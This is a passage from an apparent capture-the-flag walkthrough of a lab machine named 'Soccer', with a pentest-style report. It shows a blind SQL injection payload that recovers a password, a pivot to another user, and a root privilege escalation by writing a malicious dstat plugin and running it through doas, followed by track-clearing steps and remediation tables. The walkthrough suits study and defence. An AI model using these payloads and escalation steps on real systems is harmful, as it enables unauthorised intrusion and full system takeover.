Using payload : {&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \&quot;player\&quot; AND BINARY SUBSTR(password,20,1) = &#x27;2&#x27;)-- -&quot;}
Password found : PlayerOftheMatch2022</div>
  <p>We found the password of player user account. If this user used the same password for his local user account, we can escalate our privileges to this user :</p>
  <div class="codeBlock">(remote) www-data@soccer:/var/www/html/tiny/uploads$ su player
Password: 
player@soccer:/var/www/html/tiny/uploads$ id
uid=1001(player) gid=1001(player) groups=1001(player)</div>
  <p>We have now a shell as player.</p>
  <h2 id="privilege-escalation-root">Privilege escalation (root)</h2>
  <p>Let‚Äôs see if there is any interesting binaries with the SUID bit enabled :</p>
  <div class="codeBlock">player@soccer:/var/www/html/tiny/uploads$ find / -type f -perm -4000 2&gt;/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign</div>
  <p>As we can see, doas is installed on the system. We can take a look at the configuration file of doas to see if we can run any binaries as root :</p>
  <div class="codeBlock">player@soccer:/var/www/html/tiny/uploads$ find / -type f -name &quot;doas.conf&quot; 2&gt;/dev/null
/usr/local/etc/doas.conf
player@soccer:/var/www/html/tiny/uploads$ cat /usr/local/etc/doas.conf 
permit nopass player as root cmd /usr/bin/dstat</div>
  <p>We can run dstat as root without password.</p>
  <blockquote>
    Dstat is a versatile replacement for vmstat, iostat and ifstat. Dstat overcomes some of the limitations and adds some extra features.<br>
    <br>
    Dstat allows you to view all of your system resources instantly, you can eg. compare disk usage in combination with interrupts from your IDE controller, or compare the network bandwidth numbers directly with the disk throughput (in the same interval).
  </blockquote>
  <p>
    Dstat can run python plugins. We may be able to create a malicious python script and run it thought dstat as root to gain a shell as root. 
    According to the dstat manual, we can create a custom python plugin in the following locations :
  </p>
  <div class="codeBlock">FILES
       Paths that may contain external dstat_*.py plugins:

           ~/.dstat/
           (path of binary)/plugins/
           /usr/share/dstat/
           /usr/local/share/dstat/</div>
  <p>If we take a look at the last path, we can see that it is writable by the player user :</p>
  <div class="codeBlock">player@soccer:/var/www/html/tiny/uploads$ ls -la /usr/local/share/dstat/
total 8
drwxrwx--- 2 root player 4096 Dec 12  2022 .
drwxr-xr-x 6 root root   4096 Nov 17  2022 ..</div>
  <p>Now, let‚Äôs create the malicious python script and execute it through dstat :</p>
  <div class="codeBlock">player@soccer:/var/www/html/tiny/uploads$ echo &#x27;import os; os.execv(&quot;/bin/sh&quot;, [&quot;sh&quot;])&#x27; &gt; /usr/local/share/dstat/dstat_exploit.py
player@soccer:/var/www/html/tiny/uploads$ doas -u root /usr/bin/dstat --exploit
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module&#x27;s documentation for alternative uses
  import imp
# id
uid=0(root) gid=0(root) groups=0(root)
#</div>
  <p>We have now a shell as root !</p>
  <h1 id="clearing-tracks">Clearing tracks</h1>
  <table>
    <thead>
      <tr>
        <th>Step</th>
        <th>Tracks to remove</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Initial access</td>
        <td>- Remove shell.php from /var/www/html/tiny/uploads</td>
      </tr>
      <tr>
        <td>Post-Exploitation - Privilege escalation (root)</td>
        <td>- Remove dstat_exploit.py from /usr/local/share/dstat/</td>
      </tr>
    </tbody>
  </table>
  <h1 id="vulnerabilities-summary">Vulnerabilities summary</h1>
  <h2 id="default-credentials">Default credentials</h2>
  <table>
    <thead>
      <tr>
        <th>Field</th>
        <th>Value</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Affected component</td>
        <td>Tiny File Manager</td>
      </tr>
      <tr>
        <td>CVSS 3.0 score</td>
        <td><mark class="highlight_red">9.8</mark></td>
      </tr>
      <tr>
        <td>Severity</td>
        <td><mark class="highlight_red">CRITICAL</mark></td>
      </tr>
      <tr>
        <td>Attack vector</td>
        <td>Network</td>
      </tr>
      <tr>
        <td>Impact</td>
        <td>
          Allows an attacker to access the Tiny File Manager and upload a malicious PHP file to gain a foothold on the system as www-data.<br>
          <br>
          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b>, <b>integrity</b> and <b>availability</b> of the affected component.
        </td>
      </tr>
      <tr>
        <td>Remediation proposition</td>
        <td>Change the default credentials (for both admin and user account) and use a strong password.</td>
      </tr>
    </tbody>
  </table>
  <h2 id="web-server-misconfiguration">Web server misconfiguration</h2>
  <table>
    <thead>
      <tr>
        <th>Field</th>
        <th>Value</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Affected component</td>
        <td>Nginx</td>
      </tr>
      <tr>
        <td>CVSS 3.0 score</td>
        <td><mark class="highlight_red">8.8</mark></td>
      </tr>
      <tr>
        <td>Severity</td>
        <td><mark class="highlight_red">HIGH</mark></td>
      </tr>
      <tr>
        <td>Attack vector</td>
        <td>Network</td>
      </tr>
      <tr>
        <td>Impact</td>
        <td>
          If an attacker gains access to Tiny File Manager, he is able to upload a webshell in the uploads directory and gain a foothold on the system as www-data.<br>
          <br>
          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b>, <b>integrity</b> and <b>availability</b> of the affected component.
        </td>
      </tr>
      <tr>
        <td>Remediation proposition</td>
        <td>Either blacklist PHP files from the upload functionality, or change the nginx configuration to disable execution of PHP files in the /uploads directory.</td>
      </tr>
    </tbody>
  </table>
  <h2 id="structured-query-language-injection">Structured Query Language injection</h2>
  <table>
    <thead>
      <tr>
        <th>Field</th>
        <th>Value</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Affected component</td>
        <td>Websocket server</td>
      </tr>
      <tr>
        <td>CVSS 3.0 score</td>
        <td><mark class="highlight_red">7.5</mark></td>
      </tr>
      <tr>
        <td>Severity</td>
        <td><mark class="highlight_red">HIGH</mark></td>
      </tr>
      <tr>
        <td>Attack vector</td>
        <td>Network</td>
      </tr>
      <tr>
        <td>Impact</td>
        <td>
          Allows an attacker to injecte arbitrary SQL code and retrieve data from the MySQL databases.<br>
          <br>
          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the affected component.</td>
      </tr>
      <tr>
        <td>Remediation proposition</td>
        <td>
          - Use prepared queries<br>
          - Sanitize data sent in the id parameter to the websocket<br>
          - You could also set up a WAF to detect and block malicious traffic such as SQL injection attempts
        </td>
      </tr>
    </tbody>
  </table>
  <h2 id="clear-text-credentials">Clear-text credentials</h2>
  <table>
    <thead>
      <tr>
        <th>Field</th>
        <th>Value</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Affected component</td>
        <td>MySQL database</td>
      </tr>
      <tr>
        <td>CVSS 3.0 score</td>
        <td><mark class="highlight_red">7.5</mark></td>
      </tr>
      <tr>
        <td>Severity</td>
        <td><mark class="highlight_red">HIGH</mark></td>
      </tr>
      <tr>
        <td>Attack vector</td>
        <td>Network</td>
      </tr>
      <tr>
        <td>Impact</td>
        <td>
          If an attacker has access to the database, he is able to read clear text passwords.<br>
          <br>
          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b> of the affected component.
        </td>
      </tr>
      <tr>
        <td>Remediation proposition</td>
        <td>Don‚Äôt store clear-text passwords. Instead, store hashes using strong algorithm like Argon 2, Bcrypt or Scrypt.</td>
      </tr>
    </tbody>
  </table>
  <h2 id="improper-access-control">Improper access control</h2>
  <table>
    <thead>
      <tr>
        <th>Field</th>
        <th>Value</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Affected component</td>
        <td>Local system</td>
      </tr>
      <tr>
        <td>CVSS 3.0 score</td>
        <td><mark class="highlight_red">8.4</mark></td>
      </tr>
      <tr>
        <td>Severity</td>
        <td><mark class="highlight_red">HIGH</mark></td>
      </tr>
      <tr>
        <td>Attack vector</td>
        <td>Network</td>
      </tr>
      <tr>
        <td>Impact</td>
        <td>
          If an attacker gains access to the player user account, he can write malicious python scripts in the dstat plugin directory. Since player user can run dstat as root, 
          an attacker can leverage this to execute arbitrary code as root and gain access to the entire system.<br>
          <br>
          This has a <mark class="highlight_red">high</mark> impact on the <b>confidentiality</b>, <b>integrity</b> and <b>availability</b> of the affected component.
        </td>
      </tr>
      <tr>
        <td>Remediation proposition</td>
        <td>Change the group of <code>/usr/local/share/dstat</code> from player to root. This way, player user cannot run arbitrary python code as root.</td>
      </tr>
    </tbody>
  </table>
  <h1 id="tools-used">Tools used</h1>
  <table>
    <thead>
      <tr>
        <th>Tool</th>
        <th>Purpose</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><a href="https://nmap.org/">nmap</a></td>
        <td>
          - Scan for open ports<br>
          - Scan for services versions
        </td>
      </tr>
      <tr>
        <td><a href="https://pwncat.readthedocs.io/en/latest/installation.html">pwncat-cs</a></td>
        <td>- Handle reverse shell connection</td>
      </tr>
      <tr>
        <td><a href="https://portswigger.net/burp">BurpSuite</a></td>
        <td>- Capture and edit web requests</td>
      </tr>
    </tbody>
  </table>
  <h1 id="sources">Sources</h1>
  <ul>
    <li>Dstat manual : <a href="https://linux.die.net/man/1/dstat">https://linux.die.net/man/1/dstat</a></li>
  </ul>
  <ul>
    <li>Dstat privilege escalation : <a href="https://gtfobins.github.io/gtfobins/dstat/">https://gtfobins.github.io/gtfobins/dstat/</a></li>
  </ul>
</div>
